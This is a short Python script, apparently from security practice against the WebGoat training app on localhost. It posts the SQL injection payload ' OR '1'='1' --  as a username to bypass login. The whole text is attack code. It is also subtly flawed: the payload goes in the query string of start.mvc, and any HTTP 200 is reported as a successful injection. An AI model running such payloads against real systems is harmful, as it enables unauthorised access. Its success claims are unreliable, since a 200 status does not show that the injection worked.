import requests
from urllib import parse

# Define the URL of the target application
url = "http://127.0.0.1:8080/WebGoat/start.mvc"

# SQL Injection payload
sql_injection_payload = "' OR '1'='1' -- "

# Prepare the data dictionary with the injection payload
data = {
    "username": sql_injection_payload,
}

# Encode the parameters
params = parse.urlencode(data)

# Send the POST request to the target application
response = requests.post(f"{url}", params=params, headers={'Content-type': 'application/x-www-form-urlencoded', 'Accept': 'text/plain'})

# Check if the injection was successful
if response.status_code == 200:
    print("Successfully injected SQL query.")
else:
    print(f"Failed to inject SQL query - Status Code {response.status_code}")